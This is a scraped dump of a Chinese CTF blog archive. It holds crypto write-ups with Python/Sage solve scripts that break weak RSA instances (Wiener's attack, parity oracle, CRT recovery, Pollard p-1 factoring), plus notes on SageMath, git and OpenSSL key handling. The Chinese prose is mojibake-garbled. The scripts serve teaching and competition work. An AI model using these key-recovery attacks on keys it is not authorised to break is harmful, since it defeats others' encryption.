Ã— 78 234041 m1 = 3 m2 = 78234041 p = 689159326758330864205993810270646658558112329195746149991184055909755461246626153920231796960903018393806410715812453949253930576368274228434916375544579284365205241766136566047482065208442992856658212126772417415403473480889927931481129434854332858754668120563818975006384512615022532233244596546830392476321031156328699572283946257730515089543367929326280871305776349305346159311591820455943842203357066465523558715870586535188343603460826231817622511283563179065036619023415848694281294463836320838105950552498785365535923041927491743402053568747113507098917091780797009380675587381805253390649630338055131031679595664055361678114747608302944715308343764678875659039394225950479683967885912291399162609094622980318391045105733088508798371414996479107970975717563552614856114065668728607215268431341079233630995168600896375314067716366181300081684353583326214062788182429536300917720999423489104723824360299238754986351169209709892739317096741609428484854087163771300777717883057028145424827875496235567904291417092378448353222179114362314382900648079547647848024440220204768433974038004942869937932015294078073975703156613070125753344841550872429670559866184492945262960524545894823245933714684747784492095876370443994948425495841 q = 825745527393875213112416399161876312807690899587680405323661594634206777626830009225425708368452900127898718079772635289577153999013886667961217430074282603941419231606982549262875927598587116257227403646863891999503669499691226452373375235370860079746071677621652251885930328523487781646712042859931782618220703334721235289166285140690745773731238255224060549452664943877872987321262039002730465087234720391689961341109105478873987526603600402429600189003498632775079541462166163941851848765036872700541100390593375609399046693728399625801469156502270197170371875324720480650306785436605155686110619524005509832014145815734269685871332335544226747535167347621137129026799054475196918117687928602288868853220954790928729951229529274652854752754075975718778340195177601007255969037312694713797288603741759269754480872584968304627973646008573027346743614653988753674721004169739334587145202207452102165404828315977860122216069411238549765007288548786956279851184761238592429597293858204186200925553719690039361569082671701947951613715432578165026545428849347274156827008272891661068698821932170724135412872216787954099301438985821980885240717232218707592014222715174630839806063753862210894420887328995052744595750340725332465581373047 e = 0x10001 n = 133561991523711714238641512987809330530212246892569593026319411449791084194115873781301422593495806927875828290629679020098834182528012835469352471635087375406306534880352693134486855968468946334439553553593196889196239169351375517588892769598963002098115826389220099548938169095670740942251209102500450728442583559710183771974489284632651296188035458586935211952691589627681567274801028577256215269233875203212438263987034556969968774119389693056239796736659926866707857937025200924828822267781445721099763436020785585453958594470906716195030613615725126057391084801585533926767137218524047259398886392592317910204988634868663634415285507325190415658931169841182499733179254162060738994027842088553562013488445789594342451823783136881968032197575016845492231433684884872631894561254381663562267075103417879327236182565223877901300392217967589154857009356640377622996801781797109089687661697856930394706016954531077165127402008444818092498106642068414208190583373314287381712963712098566595399301400378116274132918572709221391531621228936206630829355801192700264684469488261781954165940553346889395507153750291402535330239420975542926664420153925171757944018621411265539452424569343708318070259746118326558005521868356304582694159507379335214599839668805877215983938986674084063185863612335339836810044252829401409522709997562887276661672718820881541500852400369184737236082178767653725044900394959369367604992512713490494168594433000695046297712977059205623777990102604073885527049867682390577577616773090662829024271568456346362315351643767420198116229892060385453123572533267805396437865025639093881944841521458804810097550625853182396288247815370818578103543117466070812804267915674186488979548392193291727228018246788487524292081389142018151246889408421936865224469589631518283230229213787648552632437566756058034131355439709320923876063030896228165897498746898125821639893238387694549304110003941329763552493326245073779912107372271854798616245416264801377068163622812994786201580895459712414134184992440395336131037558976058298521312536969408724436512019410835904564817724243688308776888170183074838453466914170790840559860531933430176605716828492670093771129301541861534595181565621644268739349035133062776852304594204220291667924128313579203359827093150911871520605180797438668872585571501531844999598674037998642821148417473110716470439750642781609483016636419373004760601783594025036152924259863627732874940148083408474700265895269165869619971810103499607445649821 c = 65553658155452064459040687299632299415295760116470555100400688788937893101658136830409082198753928673469636810831761104117535054304536941814523449491308187105740319828511969750359402834799486354958723098881095067882833993358468923611118977258293638107874383059048015701807718209929028151240509801801995570592890519253676774278321334154528938199389248563657673061299152526380072934917964488153875744843855913524788571997024947738868563951687976817548296078497817264410193882661874749304071168979787307490320366615899942861059615405569154961435894469325778407081182151320629413711622905703628430999201763846682516985530373643176026602901129520439581385946775511292435206913016381293219606333035648747877313424616408338829137581998558399694071257787294948211441360283876078405831210625321012072477187438320944119825970347654743794743846351762763177440045084761025728597526592892602263484022280653040195670941221493307430623213388669939114424884078502946247136016528925968280034099568454876076717790529204207317485416329062672971939549478648687894958552760953682796211975576320713576155031581257782352223857605149825435939889497465805857339911597479498085071301601506276220487493620870555545057189236870008182212284992968466451864806648279032294546676543599599279519394341289357968292292966055189578253350591765186079486142930848439238134776982658066494378507873003509820326863340562093906137812952544399266821679905073464535234547335867090392493005792528534561846391285698943396889671437127470587837989050518266365099789392584686615435440486086402941357614369171354355307532351370775920044953381482310949663868493911752104873824099597326393857349237228788875273525189373323552519106738497767546337587947368062413334887230166285909705065920918078052826480092129173127887307158867274895914733110276134124505178182548094607594799978378381804502097507167978950926067243870989514735314054362049917668015341349933704885009878192354865067520219676784278082055728039064858769077997521541853184489175120623176481708269464933868222226748491078319156602229948646960513946846417957356535995079525993783278312017766715177078804065822913241465133977233398851120059496221650357891946344151601586169979516826622503491746992282716591488199657450776596383692706657692673860134555990821730412919497018889046615548520878486492644159735144935329502984929679831356967030870226422768447430410031028770529758721438528263719267616233686813781828066547393953352033364851486926368090757420184816634373721 # print(p*q*m) # c = pow(123, e, n) phi = (p-1)*(m1-1)*(q-1)*(m2-1) d = invert(e, phi) print(long_to_bytes(pow(c, d, n))) # 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047 challenge3 # from Crypto.Util.number import * n = 14857387925078594782296815160632343246361073432459148990826882280149636079353743233970188012712079179396872746334143946166398665205889211414809061990804629906990919975187761209638578624750977626427334126665295876888197889611807587476285991599511809796600855689969285611439780660503760599419522224129074956376232480894299044645423966132497814477710701209588359243945406653547034819927990978087967107865071898215805154003530311865483912924517801551052430227039259201082691698480830966567550828053196299423168934840697637891311424286534363837640448614727396254288829197614805073711893711252067987576745683317789020760081 c = 14035143725862612299576867857272911865951893239411969382153274945929406881665641140566462510177132511558933111728871930062074990934496715765999564244916409345156132996227113853067808126894818934327468582686975383715892108247084995817427624992232755966398834682079985297050358462588989699096264155802168300026093598601350106309023915300973067720164567785360383234519093637882582163398344514810028120555511836375795523327469278186235781844951253058134566846816114359878325011207064300185611905609820210904126312524631330083758585084521500322528017455972299008481301204209945411774541553636405290572228575790342839240414 x = 675003330981130439478093707252121278358852500850751357 M = 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047000000000000000000000000000000000000000000000000000000 e = 5 c = pow(M+x, e, n) print(c) print(long_to_bytes(M+x)) # d0g3{e173c0f114c59c2bdea69c67422be407} æ±‚xç”¨è¿™ä¸ªè„šæœ¬\nsagemath github å¯¹M,C,N,e,betaåšå¥½é™åˆ¶å°±æ¬§å…‹äº†\n","date":"26 November 2020","permalink":"/achieve/2019to2021/%E5%AE%89%E5%AF%BBwp/","section":"archive","summary":"åšäº†ä¸€ç‚¹å¾®å°çš„å·¥ä½œ","title":"å®‰å¯»wp"},{"content":"ğŸ§“ç¬¬ä¸€æ¬¡æ‰“ç¿”â˜ğŸ§ºï¼Œè¢«è¿«è¯»äº†ä¸€ç¯‡è®ºæ–‡ï¼Œæ™šä¸Šæ°ğŸ”¥é”…æƒ³åˆ°äº†ç¬¬äºŒä¸ªè„‘æ®‹é¢˜ï¼Œæœ¬æ¥æƒ³ç€æ™šä¸Šæ¥æ¿€æƒ…LLLç»“æœè¢«é˜Ÿå‹èƒŒåˆºäº†ï¼Œ\næƒ³é—®ä¸€ä¸‹æŸäº›é˜Ÿæ˜¯æ€ä¹ˆçªç„¶è„‘å­å¼€çªäº†ä¸€å°æ—¶ä¹‹å†…ä¸€èµ·å­¦ä¼šLLLäº†å—ï¼Ÿ\næ”¾ä¸ªsb wpä»¥æ˜æ‚²æ„¤ä¹‹æƒ…\nsimpleRSA # sage\nfrom Crypto.Util.number import * e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173 c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452 m = 12345 c1 = pow(m, e, n) list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: d = int(i.denominator()) m1 = pow(c1, d, n) if m1 == m: print(d) break print(long_to_bytes(pow(c,d,n))) # b\u0026#39;flag{1c40fa8a-6a9c-4243-bd83-cd4875ea88cc}\u0026#39; more_calc # è¿™ä¸ªé¢˜åƒé¥­çš„æ—¶å€™çªç„¶æƒ³èµ·è¿™ä¹ˆåšäº†ï¼Œç„¶åå›å™¨é‚£ç”µè„‘çš„æ—¶å€™å‘ç°è¢«banäº†ğŸ˜\n$m^e \\equiv c;mod;q*p$\n$m^e \\equiv c\\equiv c_1;mod;p$\nå¦‚æœ $p\u0026gt;m$(ä¸€èˆ¬æ˜¯å¤§äºçš„)\n$e*d\\equiv1;mod;p$\n$c^d\\equiv m^{ed}\\equiv m ;mod;n$\nsage\nimport gmpy2 from Crypto.Util.number import * p = 27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069 c = 350559186837488832821747843236518135605207376031858002274245004287622649330215113818719954185397072838014144973032329600905419861908678328971318153205085007743269253957395282420325663132161022100365481003745940818974280988045034204540385744572806102552420428326265541925346702843693366991753468220300070888651732502520797002707248604275755144713421649971492440442052470723153111156457558558362147002004646136522011344261017461901953583462467622428810167107079281190209731251995976003352201766861887320739990258601550606005388872967825179626176714503475557883810543445555390014562686801894528311600623156984829864743222963877167099892926717479789226681810584894066635076755996423203380493776130488170859798745677727810528672150350333480506424506676127108526488370011099147698875070043925524217837379654168009179798131378352623177947753192948012574831777413729910050668759007704596447625484384743880766558428224371417726480372362810572395522725083798926133468409600491925317437998458582723897120786458219630275616949619564099733542766297770682044561605344090394777570973725211713076201846942438883897078408067779325471589907041186423781580046903588316958615443196819133852367565049467076710376395085898875495653237178198379421129086523 e = 0x10001 d = inverse(e,p-1) print(long_to_bytes(pow(c,d,p))) # b\u0026#39;flag{3d7f8da9-ee79-43c0-8535-6af524236ca1}\u0026#39; ","date":"25 November 2020","permalink":"/achieve/2019to2021/%E7%BF%94%E4%BA%91/","section":"archive","summary":"ğŸ§“ç¬¬ä¸€æ¬¡æ‰“ç¿”â˜ğŸ§ºï¼Œè¢«è¿«è¯»äº†ä¸€ç¯‡è®ºæ–‡ï¼Œæ™šä¸Šæ°ğŸ”¥é”…æƒ³åˆ°äº†ç¬¬äºŒä¸ªè„‘æ®‹é¢˜ï¼Œæœ¬æ¥æƒ³ç€æ™šä¸Šæ¥æ¿€æƒ…LLLç»“æœè¢«é˜Ÿå‹èƒŒåˆºäº†ï¼Œ","title":"ç¿”äº‘"},{"content":"#æ•´æ•°åŸŸ,æœ‰ç†æ•°åŸŸå’Œå®æ•°åŸŸ ZZ(3) QQ(0.25) RR(2^0.5) #å¤æ•°åŸŸ CC(1,2) #ç”Ÿæˆè™šæ•°å•ä½i i=ComplexField().gen();(2+i)*(4+3*i) #æ„é€ å¤šé¡¹å¼ç¯,è¿”å›å…·æœ‰ç»™å®šå±æ€§å’Œå˜é‡åçš„å…¨å±€å”¯ä¸€çš„å•å˜é‡æˆ–å¤šå…ƒå¤šé¡¹å¼ç¯ #å®šä¹‰åœ¨æ•´æ•°åŸŸä¸Šçš„å¤šé¡¹å¼ç¯Rï¼Œå˜é‡ä¸ºw;ZZä¹Ÿå¯æ¢æˆå…¶ä»–æ•°åŸŸ R.\u0026lt;w\u0026gt;=PolynomialRing(ZZ);R (1 + w)^3 #æœ‰é™ç¯ FR=Integers(17);FR #è‡ªèº«çš„ä»£æ•°æ‰©å±•;exR=FR[w]/(w^2+3) exR=FR.extension(w^2+3)ï¼›exR #ä»¥pythonæ•´æ•°çš„å½¢å¼è¿”å›æ‰€æœ‰å¯é€†å…ƒç´ çš„åˆ—è¡¨ FR.list_of_elements_of_multiplicative_group() #å‡è®¾ç¯çš„ä¹˜æ³•ç¾¤æ˜¯å¾ªç¯çš„ï¼Œè¿”å›è¿™ä¸ªç¯çš„ä¹˜æ³•ç¾¤çš„ç”Ÿæˆå…ƒ FR.multiplicative_generator() #è¿”å›è¿™ä¸ªç¯çš„ä¸€ä¸ªéšæœºå…ƒç´  FR.random_element() #ä¸Šè¿°å‡ ç§æ–¹æ³•å¯¹å¦‚ä¸‹çš„åŸŸåŒæ ·æ”¯æŒ #æœ‰é™åŸŸ #ç´ æ•°åŸŸ G1=GF(37);G1 #ä¼½ç½—ç“¦åŸŸ G2=GF(3^5);G2 # ans = c mod n ä¸­å›½å‰©ä½™å®šç†æ‰©å±•æ¢­å“ˆå‡½æ•° # return ans, é€šè§£çš„ ans+k*N (N = lcm([n1~ni])) crt(c,n) ","date":"24 November 2020","permalink":"/achieve/2019to2021/sagemath/","section":"archive","summary":"#æ•´æ•°åŸŸ,æœ‰ç†æ•°åŸŸå’Œå®æ•°åŸŸ ZZ(3) QQ(0.","title":"sagemathåŸºç¡€"},{"content":" å‘¨äº”æ‰“äº†ä¸ªç”µä¿¡çš„ç ´æ¯”èµ›ï¼Œæœ¬æ¥ä»æ•™å®¤èµ¶å›æ¥åªå‰©ä¸€ä¸ªåŠå°æ—¶äº†ï¼Œåˆšå†™å¥½expæœåŠ¡å™¨æœ‰ç‚¸äº†ï¼Œ ä¸€æ°”ä¹‹ä¸‹ç›´æ¥åƒé¥­ :( æ™šä¸Š7ç‚¹æ‰æ‰“åˆ°flag\nRSA parity oracle # RSA parity oracleé€‰æ‹©å¯†æ–‡æ”»å‡»çš„ä¸€ç§ï¼Œå¯ä»¥è§£å¾—å¯†æ–‡ï¼ŒåŸç†æ˜¯äºŒåˆ†æ³•å’Œæ¨¡è¿ç®—çš„æ€§è´¨ï¼Œå¤§æ¯”èµ›é‡Œé¢è¿˜æ²¡æ€ä¹ˆè§è¿‡ç›´æ¥æ‰’wikiæ‰“æ³•æ¥å‡ºé¢˜çš„ï¼ˆé€—æ¯”æ˜Ÿç›Ÿé™¤å¤–ï¼‰,åˆ©ç”¨æ¡ä»¶ä¹Ÿæ¯”è¾ƒè‹›\næ ¸å¿ƒäºŒåˆ† # wiki\nlb = 0\rub = N\rif server returns 1\rlb = (lb+ub)/2\relse:\rub = (lb+ub)/2\rexpåŠå…¶é™„ä»¶ # é™„èµ ä¸€ä¸ªä¸´æ—¶å†™çš„åƒåœ¾çš„socketç±»\ngithub\n","date":"8 November 2020","permalink":"/achieve/2019to2021/%E7%94%B5%E4%BF%A1/","section":"archive","summary":"å‘¨äº”æ‰“äº†ä¸ªç”µä¿¡çš„ç ´æ¯”èµ›ï¼Œæœ¬æ¥ä»æ•™å®¤èµ¶å›æ¥åªå‰©ä¸€ä¸ªåŠå°æ—¶äº†ï¼Œåˆšå†™å¥½expæœåŠ¡å™¨æœ‰ç‚¸äº†ï¼Œ ä¸€æ°”ä¹‹ä¸‹ç›´æ¥åƒé¥­ :( æ™šä¸Š7ç‚¹æ‰æ‰“åˆ°flag","title":"socketå¿«ä¹æ— è¾¹"},{"content":" åˆæ˜¯ä¸è®°ä¸€ä¸‹ç«‹é©¬å°±ä¼šå¿˜çš„ä¸œè¥¿\nä¸‹è½½ # git clone https://github.com/ljahum/xxxxxxxx æ›´æ–°ä¸Šä¼  # å‘æ–‡ä»¶å¤¹å†…ä¼ å…¥æ–°æ–‡ä»¶å\næ›´æ–°.git\ngit add . æ·»åŠ å¤‡æ³¨\ngit commit -m \u0026quot;frist commit\u0026quot; Pashå›åŸæ¥çš„ä½ç½®ï¼ˆæˆ‘è¿™é‡Œæ˜¯mainï¼‰\ngit push -u origin main ","date":"5 November 2020","permalink":"/achieve/2019to2021/github%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","section":"archive","summary":"åˆæ˜¯ä¸è®°ä¸€ä¸‹ç«‹é©¬å°±ä¼šå¿˜çš„ä¸œè¥¿","title":"GithubåŸºæœ¬ä½¿ç”¨"},{"content":"\rNOiSE 2021-1-19æ›´æ–° # CRT åŒä½™å¼æ€§è´¨åŠå…¶åº”ç”¨ $$ \\begin{aligned} n_i\\times r_i\\equiv c_i mod ;s \\\\ n_i r_i= c_i +k_is \\end{aligned} $$\n$r_i\u0026lt;s$\nå¯ä»¥é€‰å–nçš„å€¼å¾—åˆ°\n$n_i r_i= c_i +s$\n$-c_i= s; mod;n_i$\nCRTå¾—è§£ # â‘§è¯´äº†ï¼Œå­¦åˆ°å¾ˆå¤š\nWP\nnoise # é¢˜ç›®é™„ä»¶\rserver\nè¿™ä¸ªé¢˜æ ¸å¿ƒç‚¹åœ¨è¿™æ®µä»£ç ä¸Š\nprint(num * getrandbits(992) % secret) numæ˜¯è¾“å…¥ï¼Œä¹˜ä¸Šä¸€ä¸ª992bitsçš„éšæœºæ•°åè¿”å›æ¨¡ä¸Š secret çš„ç»“æœã€‚\näºæ˜¯æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹å¼ï¼š\n$n_i\\cdot\\ g_i\\equiv c_i ;mod ;m$\n$n_i\\cdot\\ g_i=c_i+k\\cdot m$\nåˆ™æœ‰\n$0\\equiv c_i+k\\cdot m; mod ;n_i$\nè‹¥$k=1$åˆ™æœ‰ä¸‹å¼\n$n_i-c_i\\equiv m;mod;n_i$\nè‹¥èƒ½æ±‚å‡ºå¤šä¸ªä¸Šè¿°å¼å­ï¼Œåˆ™æœ‰å‡ ç‡ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚å‡º$m$\næ•´ç‚¹æ¦‚ç‡çš„ä¸œè¥¿ # è¦$k=1$åˆ™éœ€è¦$m\u0026lt;n_i\\cdot g_i\u0026lt;2m$,å› ä¸º$g,m$æœ‰å›ºå®šçš„bité•¿åº¦ï¼Œæƒ³æ€¼å‚æ•°å–å¯¹æ•°åˆ†æï¼š\n$m,g$å‡æœ‰äºŒåˆ†ä¹‹ä¸€çš„æ¦‚ç‡åˆ†åˆ«å¤§äº$2^{1024},2^{992}$,å½“æ»¡è¶³æ”¹æ¡ä»¶æ—¶ï¼Œè®¾ï¼š\n$$ log(m)=2^{1024}\\cdot 2^\\gamma, log(n)=2^{32}\\cdot 2^\\beta , log(g)=2^{992}\\cdot 2^\\alpha $$\nå¯å¾—ä¸‹å¼ï¼š\n$$ \\gamma\u0026lt;\\beta\\cdot\\alpha\u0026lt;\\gamma +1 $$\nå·²çŸ¥æˆ‘ä»¬åªèƒ½æ§åˆ¶ $n_i$ å³ $\\beta$ï¼Œåˆå› ä¸ºå½“$\\beta$è¿‡å°æ—¶ä¼šæœ‰$m\u0026gt;n_i\\cdot g_i$åˆ™ä¼šå‡ºç°$c_i=n_i\\cdot g_i$,éªŒè¯æ˜¯å¦è¿‡å°åªéœ€è¦éªŒè¯$c_i;mod ;n_i\\neq;0$å°±okäº†\næ‰€ä»¥ç»¼ä¸Šï¼Œåº”è¯¥å°†$n_i$æ§åˆ¶çš„å°½é‡å°ã€‚\né€‰å– $n$ # å› ä¸ºæˆ‘ä»¬æ±‚å‡ºçš„å¼å­$n_i-c_i\\equiv m;mod;n_i$éœ€è¦æ»¡è¶³CRTçš„æˆç«‹æ¡ä»¶æ•…æ‰€ä»¥$n_i$åº”è¯¥å‡ä¸ºç´ æ•°ã€‚\nè¿™é‡Œç”¨ä¸‹å¼ç”Ÿæˆ$n_i$:\npoint = int(sqrt(1.1)*pow(2,32)) ed = pow(2, 16) num = next_prime(getRandomRange(point-ed, point+ed)) ç¼–å†™ä»£ç æµ‹è¯•ç®—æ³• # test.py\nå¹³å‡æµ‹è¯•ä¸‹æ¥30~40æ¬¡æ—¶å¯ä»¥æ‰“é€šçš„ï¼Œåœ¨å¯æ¥å—èŒƒå›´å†… =v=\n","date":"5 November 2020","permalink":"/achieve/2019to2021/bytectf2020/","section":"archive","summary":"NOiSE 2021-1-19æ›´æ–° # CRT åŒä½™å¼æ€§è´¨åŠå…¶åº”ç”¨ $$ \\begin{aligned} n_i\\times r_i\\equiv c_i mod ;s \\\\ n_i r_i= c_i +k_is \\end{aligned} $$","title":"å­—èŠ‚CTF2020"},{"content":" è¿™ç§ä¸œè¥¿ä¸è®°ä¸‹æ¥é©¬ä¸Šå°±ä¼šå¿˜è®° opensslä¸‹è½½é€Ÿåº¦å°±ååˆ†ç„å­¦ã€‚ã€‚ã€‚æœ€åè¦è‡ªå·±é…ç¯å¢ƒå˜é‡\nopenssl-rsa åŸºæœ¬ä½¿ç”¨ # ç”Ÿæˆrsaå¯†é’¥å¯¹ï¼ˆç§é’¥ï¼‰ # ç”Ÿæˆ2048bité•¿åº¦ åŒ…å« e,d,n,q,p,dp,dq openssl genrsa -out privkey.pem 2048\næå–å…¬é’¥ # åŒ…å« n,e openssl rsa -in privkey.pem -pubout -out pubkey.pem æå–csrè¯ä¹¦ # openssl req -new -key privkey.pem -out ca.csr\næå–å¯†é’¥ä¿¡æ¯ # å…¬ç§é’¥æ¨¡æ•° # openssl rsa -in .\\pubkey.pem -pubout -modulus\nopenssl rsa -in .\\pubkey.pem -pubin -modulus\næå–æ‰€æœ‰ä¿¡æ¯ # openssl asn1parse -i -in privkey.pem\nå…¬é’¥è¦æŒ‡å®šåç§»æŸ¥çœ‹ï¼Œbit stringçš„åç§»æ˜¯19\nopenssl asn1parse -i -in .\\pubkey.pem -strparse 19\npemã€deræ ¼å¼è½¬åŒ– # openssl rsa -in .\\private.pem -outform der -out .\\private.der\né™¤äº†ç”Ÿå­©å­ä»€ä¹ˆéƒ½èƒ½å¹²çš„python # crypto yyds\nfrom Crypto.PublicKey import RSA\nè¯»å–å…¬é’¥ä¿¡æ¯ # rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(\u0026#34;n=%\\ne=%d\u0026#34;,n,e) ç”Ÿæˆç§˜é’¥å¯¹æ–‡ä»¶ # rsa = RSA.generate(2048) public_key = rsa.publickey().exportKey() f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() private_key = rsa.exportKey() f = open(\u0026#34;private_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(private_key.decode()) f.close() å¯¹æ–‡ä»¶åŠ è§£å¯† # è½½å…¥ç¼–ç æ–¹å¼\nfrom Crypto.Cipher import PKCS1_OAEP\nrsakey=RSA.importKey(open(\u0026#34;public_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) encrypt = rsa.encrypt(flag.encode()) rsakey=RSA.importKey(open(\u0026#34;private_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) decrypt = rsa.decrypt(f.read()) ç®—å¾— n e d q p ç”Ÿæˆ private_key.key # rsa_components = (n, e, int(d), p, q) rsa = RSA.construct(rsa_components) public_key = rsa.exportKey() # æ­¤rsaä¸ä¸Šæ–‡éšæœºç”Ÿæˆçš„rsaç›¸åŒ f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() ","date":"9 October 2020","permalink":"/achieve/2019to2021/openssl-rsa/","section":"archive","summary":"è¿™ç§ä¸œè¥¿ä¸è®°ä¸‹æ¥é©¬ä¸Šå°±ä¼šå¿˜è®° opensslä¸‹è½½é€Ÿåº¦å°±ååˆ†ç„å­¦ã€‚ã€‚ã€‚æœ€åè¦è‡ªå·±é…ç¯å¢ƒå˜é‡","title":"openssl-rsaå’Œä¸€äº›æœ‰å…³pemæ ¼å¼ç§˜é’¥çš„ä¸€äº›æƒ…æŠ¥"},{"content":" ä»Šå¤©ç¢°å·§åˆåšäº†ä¸€éè¿™ä¸ªé¢˜,é™¤äº†ä¹‹å‰ç”¨yafuå—¯è§£ï¼Œåˆå»å‚è€ƒäº†ä¸€ä¸‹paperè§£æ³•\nChallenge Code # from random import choice from Crypto.Util.number import isPrime, sieve_base as primes from flag import flag def getPrime(bits): while True: n = 2 while n.bit_length() \u0026lt; bits: n *= choice(primes) # å‰10000ä¸ªé€Ÿ=ç´ æ•°ä¸­éšæœºé€‰ä¸€ä¸ª if isPrime(n + 1): return n + 1 e = 0x10001 m = int.from_bytes(flag.encode(), \u0026#39;big\u0026#39;) p, q = [getPrime(2048) for _ in range(2)] # q = ç´ æ•°*ç´ æ•°....*ç´ æ•° + 1 n = p * q c = pow(m, e, n) # n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 # c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 è§£æ³•1 # ç”¨yafuå¼ºè¡Œåˆ†è§£å› æ•°ï¼Œå› ä¸ºæ•°æ®å¤ªé•¿ï¼Œå¿…é¡»æ”¾å…¥æ–‡ä»¶ä¸­æ¥è¯»å–\n16953 :: ~\\Desktop\\Daily\\oi\\crypto Â» yafu \u0026#34;factor(@)\u0026#34; -batchfile .\\data.txt . . ***factors found*** PRP621 = 178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139 PRP621 = 184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867 ans = 1 å‡ ç§’å°±è·‘å‡ºæ¥äº†ï¼Œåº”è¯¥æ˜¯ç¨‹åºå¯Ÿè§‰å‡ºäº† n å¯ä»¥ç”¨ç®—æ³•å¿«é€Ÿåˆ†è§£\nè§£æ³•äºŒ # é¢„æœŸè§£ä¸ºPollard' p-1ç®—æ³•å’Œsmooth numberä¸¤ä¸ªçŸ¥è¯†ç‚¹\nå…ˆä»‹ç»çŸ¥è¯†ç‚¹\nPollard\u0026rsquo; p-1 ç®—æ³• # https://blog.csdn.net/weixin_42251364/article/details/95462358\npollardâ€™s p-1æ–¹æ³•æœ‰ç‚¹ç‰¹æ®Šï¼Œå®ƒåªèƒ½åº”ç”¨åœ¨æ±‚æ•´æ•°nçš„ä¸€ä¸ªç´ å› 